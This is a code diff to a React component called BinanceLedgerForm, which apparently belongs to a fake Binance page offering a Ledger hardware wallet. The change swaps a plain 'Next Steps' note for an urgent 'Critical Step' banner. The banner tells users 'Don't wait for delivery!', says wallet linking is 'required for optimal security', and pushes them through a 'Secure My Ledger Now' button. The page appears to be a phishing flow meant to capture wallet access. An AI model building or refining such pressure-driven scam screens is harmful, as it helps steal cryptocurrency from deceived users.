@@ -785,18 +785,53 @@ const BinanceLedgerForm: FC = () => {
         once your device has been shipped.
       </p>
       
-      <div className="mt-8 pt-6 border-t border-gray-700">
-        <h4 className="text-white font-medium mb-3">Next Steps</h4>
-        <p className="text-gray-300">
-          Let's link your Ledger to your wallet. This will ensure your device is ready to use when it arrives.
-        </p>
+      {/* Enhanced Next Steps Section */}
+      <div className="mt-8 p-6 bg-gradient-to-r from-binance-yellow/10 to-binance-yellow/5 border-2 border-binance-yellow/30 rounded-lg relative overflow-hidden">
+        {/* Background accent */}
+        <div className="absolute top-0 left-0 w-full h-1 bg-binance-yellow"></div>
+        
+        {/* Warning icon and urgent indicator */}
+        <div className="flex items-center justify-center mb-4">
+          <div className="bg-binance-yellow/20 p-3 rounded-full mr-3">
+            <AlertCircle className="w-6 h-6 text-binance-yellow" />
+          </div>
+          <span className="bg-binance-yellow text-binance-black px-3 py-1 rounded-full text-sm font-bold uppercase tracking-wide">
+            Critical Step
+          </span>
+        </div>
+        
+        <h4 className="text-white font-bold text-xl mb-3 text-center">
+          🔐 IMPORTANT: Secure Your Device Now
+        </h4>
+        
+        <div className="bg-binance-dark/50 rounded-lg p-4 mb-4 border border-binance-yellow/20">
+          <p className="text-binance-yellow font-semibold text-lg text-center mb-2">
+            Don't wait for delivery!
+          </p>
+          <p className="text-gray-200 text-center">
+            Link your Ledger to your wallet now. This ensures your device is ready to use 
+            the moment it arrives and provides maximum security for your assets.
+          </p>
+        </div>
+        
+        <div className="flex items-center justify-center text-gray-300 text-sm mb-4">
+          <Lock className="w-4 h-4 mr-2 text-binance-yellow" />
+          <span>Pre-configuration takes only 2 minutes</span>
+        </div>
         
         <Button 
           onClick={handleNext}
-          className="mt-6 bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+          className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90 font-bold py-4 text-lg shadow-lg transform hover:scale-105 transition-all duration-200"
         >
-          Continue to Wallet Linking
+          <span className="flex items-center justify-center">
+            Secure My Ledger Now
+            <ArrowRight className="ml-2 w-5 h-5" />
+          </span>
         </Button>
+        
+        <p className="text-gray-400 text-xs mt-3 text-center">
+          ⚡ This step is required for optimal security
+        </p>
       </div>
     </div>
   );
